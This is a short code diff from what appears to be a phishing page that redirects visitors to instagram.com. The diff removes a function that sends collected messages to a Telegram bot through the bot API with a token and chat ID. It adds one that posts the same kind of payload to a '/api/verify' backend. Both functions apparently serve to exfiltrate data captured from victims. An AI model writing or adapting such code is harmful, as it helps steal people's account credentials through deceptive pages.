@@ -91,9 +91,15 @@
         window.location.href = "https://instagram.com";
     }
 
-    async function sendToTelegram(msg) {
-        let url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
-        await fetch(url);
+    async function sendToBackend(payload) {
+    try {
+        await fetch('/api/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.log("Error sending data");
     }
 </script>
 </body>
